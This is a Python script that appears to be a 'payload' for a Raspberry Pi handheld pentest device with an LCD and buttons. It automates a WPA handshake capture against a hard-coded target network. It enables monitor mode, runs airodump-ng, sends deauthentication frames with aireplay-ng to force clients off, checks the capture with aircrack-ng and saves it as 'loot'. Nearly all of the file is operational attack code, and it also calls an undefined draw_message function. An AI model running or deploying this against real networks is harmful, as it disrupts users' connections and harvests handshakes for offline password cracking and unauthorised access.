#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi.raspyjack_integration import get_available_interfaces
from wifi.wifi_manager import WiFiManager

WIFI_INTERFACE = None
ORIGINAL_WIFI_INTERFACE = None
TARGET_BSSID = "00:11:22:33:44:55"
TARGET_CHANNEL = "6"
TARGET_ESSID = "MyHomeWiFi"
SEND_DEAUTH = True
RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
LOOT_DIR = os.path.join(RASPYJACK_DIR, "loot", "Handshakes")

PINS = { "OK": 13, "KEY3": 16, "UP": 6, "DOWN": 19 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
status_msg = "Press OK to start"
wifi_manager = WiFiManager()

def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    running = False
    if attack_thread:
        try: os.kill(attack_thread.pid, signal.SIGTERM) 
        except: pass
    
    if WIFI_INTERFACE and wifi_manager and ORIGINAL_WIFI_INTERFACE:
        print(f"Deactivating monitor mode on {WIFI_INTERFACE} and restoring {ORIGINAL_WIFI_INTERFACE}...")
        wifi_manager.deactivate_monitor_mode(WIFI_INTERFACE)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Handshake Capture", font=FONT_TITLE, fill="#FFC300")
    d.line([(0, 22), (128, 22)], fill="#FFC300", width=1)
    d.text((5, 30), f"Target: {TARGET_ESSID[:16]}", font=FONT)
    d.text((10, 50), status_msg, font=FONT, fill="yellow")
    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, status_msg
    
    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    if not available_interfaces:
        draw_message("No WiFi interfaces found!", "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    while running:
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0:
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            selected_iface = available_interfaces[current_menu_selection]
            draw_message(f"Activating monitor\nmode on {selected_iface}...", "yellow")
            
            monitor_iface = wifi_manager.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                ORIGINAL_WIFI_INTERFACE = selected_iface
                draw_message(f"Monitor mode active\non {WIFI_INTERFACE}", "lime")
                time.sleep(2)
                return True
            else:
                draw_message(f"Failed to activate\nmonitor mode on {selected_iface}", "red")
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0:
            return False
        
        time.sleep(0.1)

def run_attack():
    global status_msg
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d_%H%M%S")
    output_prefix = os.path.join(LOOT_DIR, f"handshake_{TARGET_ESSID.replace(' ', '_')}_{timestamp}")
    
    status_msg = "Listening..."
    
    try:
        command = f"airodump-ng --bssid {TARGET_BSSID} -c {TARGET_CHANNEL} -w {output_prefix} {WIFI_INTERFACE}"
        
        global attack_thread
        attack_thread = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        deauth_proc = None
        if SEND_DEAUTH:
            deauth_cmd = f"aireplay-ng -0 5 -a {TARGET_BSSID} {WIFI_INTERFACE}"
            deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        cap_file = f"{output_prefix}-01.cap"
        start_time = time.time()
        while time.time() - start_time < 120:
            if not running: break
            status_msg = f"Listening... {int(time.time() - start_time)}s"
            if os.path.exists(cap_file):
                check_cmd = f"aircrack-ng {cap_file} | grep '1 handshake'"
                if subprocess.run(check_cmd, shell=True, capture_output=True).returncode == 0:
                    status_msg = "Handshake captured!"
                    return
            time.sleep(2)

        status_msg = "Timeout reached."

    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Airodump attack failed: {e}", file=sys.stderr)
    finally:
        if attack_thread: attack_thread.terminate()
        if deauth_proc: deauth_proc.terminate()

if __name__ == '__main__':
    try:
        for cmd in ["airodump-ng", "aireplay-ng", "aircrack-ng"]:
            if subprocess.run(f"which {cmd}", shell=True, capture_output=True).returncode != 0:
                draw_message(f"{cmd} not found!", "red")
                time.sleep(3)
                raise SystemExit(f"{cmd} not found.")

        if not select_interface_menu():
            draw_message("No interface selected\nor monitor mode failed.", "red")
            time.sleep(3)
            raise SystemExit("No interface selected or monitor mode failed.")

        while running:
            draw_ui()
            
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                threading.Thread(target=run_attack, daemon=True).start()
                time.sleep(0.3)
                while status_msg not in ["Handshake captured!", "Timeout reached.", "Attack failed!"]:
                    if GPIO.input(PINS["KEY3"]) == 0:
                        cleanup()
                        break
                    time.sleep(1)
            
            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Handshake Capture payload finished.")